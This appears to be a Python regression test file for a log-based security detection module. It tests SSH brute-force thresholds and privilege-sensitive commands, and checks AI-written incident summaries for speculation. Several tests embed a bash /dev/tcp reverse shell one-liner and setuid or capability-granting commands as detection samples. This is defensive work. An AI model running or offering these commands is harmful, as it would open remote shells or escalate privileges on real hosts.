"""Pure-stdlib regression tests: detection evidence and counterexamples."""
import unittest
from Core import grounded_detection as gd


def ev(ref, raw, *, source='linux', fields=None, host='combo'):
    return {'ref': ref, 'raw': raw, 'fields': fields or {}, 'source_kind': source, 'host': host}


def ids(evs):
    return {x['rule_id'] for x in gd.detect(evs)['behavioral_findings']}


class GroundedDetectionTests(unittest.TestCase):
    def test_ssh_threshold(self):
        es = [ev(f'E{i:03}', f'Jun 15 01:00:00 combo sshd[{i}]: Failed password for root from 10.1.2.3 port 22 ssh2') for i in range(1, 6)]
        self.assertIn('LINUX_SSH_REPEAT_FAILURE', ids(es))
    def test_ssh_below_threshold(self):
        es = [ev(f'E{i:03}', f'Jun 15 combo sshd: Failed password for root from 10.1.2.3 port 22') for i in range(1, 5)]
        self.assertNotIn('LINUX_SSH_REPEAT_FAILURE', ids(es))
    def test_ssh_accepted_not_failure(self):
        self.assertEqual([], gd.detect([ev('E001', 'Jun 15 combo sshd: Accepted password for root from 10.1.2.3')])['behavioral_findings'])
    def test_ssh_unique_ref_prevents_double_count(self):
        x = ev('E001', 'Jun 15 combo sshd: Failed password for root from 10.1.2.3')
        self.assertNotIn('LINUX_SSH_REPEAT_FAILURE', ids([x] * 12))
    def test_ssh_different_ips_not_combined(self):
        es = [ev(f'E{i:03}', f'Jun 15 combo sshd: Failed password for root from 10.1.2.{i}') for i in range(1, 8)]
        self.assertNotIn('LINUX_SSH_REPEAT_FAILURE', ids(es))
    def test_chmod_sensitive(self):
        self.assertIn('LINUX_PRIVILEGE_SENSITIVE_COMMAND', ids([ev('E001','type=PROCTITLE argv=["sudo","chmod","u+s","vuln"]', fields={'argv':'["sudo"'})]))
    def test_setcap_sensitive(self):
        self.assertIn('LINUX_PRIVILEGE_SENSITIVE_COMMAND', ids([ev('E001','type=PROCTITLE argv=["sudo","setcap","cap_setuid+ep","./priv_esc"]', fields={'argv':'["sudo"'})]))
    def test_service_status_not_sensitive(self):
        self.assertEqual([], gd.detect([ev('E001','type=PROCTITLE argv=["sudo","systemctl","status","auditd.service"]')])['behavioral_findings'])
    def test_reverse_shell_detection(self):
        e = ev('E001','2024-05-31T18:01:42Z linux_process_event ref=E001', fields={'fields.CommandLine':'bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'}, source='generic')
        x = gd.detect([e])['behavioral_findings'][0]
        self.assertEqual(x['rule_id'],'LINUX_BASH_REVERSE_SHELL_PATTERN')
        self.assertEqual(x['details']['command_target_ip_scope'],'private')
        self.assertIn('NOT established', x['outcome'])
    def test_no_reverse_shell_without_redirection(self):
        self.assertEqual([], gd.detect([ev('E001','linux_process_event', fields={'CommandLine':'curl https://abc.example' })])['behavioral_findings'])
    def test_no_reverse_shell_for_unrelated_dev_tcp(self):
        self.assertEqual([], gd.detect([ev('E001','linux_process_event', fields={'CommandLine':'cat /dev/tcp/10.0.0.1/22'})])['behavioral_findings'])
    def test_boot_context(self):
        es = [ev('E001','Jul 27 14:41:57 combo kernel: BIOS-e820: 0000 - ffff (reserved)'), ev('E002','Jul 27 14:41:57 combo syslog: syslogd startup succeeded')]
        self.assertTrue(gd.detect(es)['context_observations'])
        self.assertFalse(gd.detect(es)['behavioral_findings'])
    def test_boot_is_not_host_wide_benign(self):
        x = gd.detect([ev('E001','Jul 27 14:41:57 combo kernel: BIOS-e820: reserved')])
        self.assertEqual(x['final_incident_verdict'],'human_review_required')
    def test_model_bios_speculation_flagged(self):
        es = [ev('E001','Jul 27 14:41:57 combo kernel: BIOS-e820: reserved')]
        f = gd.review_requests({'POTENTIAL ATTACK INDICATORS':'- Potential unauthorized BIOS modification or privilege escalation, but it is routine [E001]'},es)
        self.assertIn('unsupported_boot_security_speculation',{x['check'] for x in f})
    def test_model_bios_negation_is_not_flagged(self):
        es = [ev('E001','Jul 27 combo kernel: BIOS-e820: reserved')]
        self.assertEqual([],gd.review_requests({'POTENTIAL ATTACK INDICATORS':'- No evidence of unauthorized BIOS modification [E001]'},es))
    def test_machine_check_reporting_error(self):
        es = [ev('E001','Jul 27 combo kernel: Intel machine check reporting enabled on CPU#0')]
        f = gd.review_requests({'POTENTIAL ATTACK INDICATORS':'- Possible machine check event on CPU#0 [E001]'},es)
        self.assertIn('machine_check_reporting_not_error',{x['check'] for x in f})
    def test_machine_check_reporting_correct(self):
        es = [ev('E001','Jul 27 combo kernel: Intel machine check reporting enabled on CPU#0')]
        self.assertEqual([],gd.review_requests({'SIGNIFICANT SECURITY EVENTS':'- Machine check reporting enabled [E001]'},es))
    def test_reverse_shell_missing_detection(self):
        e = ev('E001','linux_process_event',fields={'CommandLine':'bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'})
        flags = gd.review_requests({'SUSPICIOUS ACTIVITIES':'- Network activity [E001]'},[e])
        self.assertIn('missed_explicit_reverse_shell_pattern',{f['check'] for f in flags})
    def test_reverse_shell_explicit_not_flagged(self):
        e = ev('E001','linux_process_event',fields={'CommandLine':'bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'})
        self.assertEqual([],gd.review_requests({'SUSPICIOUS ACTIVITIES':'- Bash reverse shell command pattern, connection unconfirmed [E001]'},[e]))
    def test_notes_are_bounded_no_raw_command(self):
        e = ev('E001','linux_process_event',fields={'CommandLine':'bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'})
        s=' '.join(gd.prompt_notes([e]))
        self.assertNotIn('10.0.255.12',s)
        self.assertIn('COMMAND PATTERN',s)
    def test_no_false_windows_alarm(self):
        es = [ev('E001','EventID=4625 FAILED password',source='windows')]
        self.assertFalse(gd.detect(es)['behavioral_findings'])


if __name__ == '__main__':
    unittest.main()
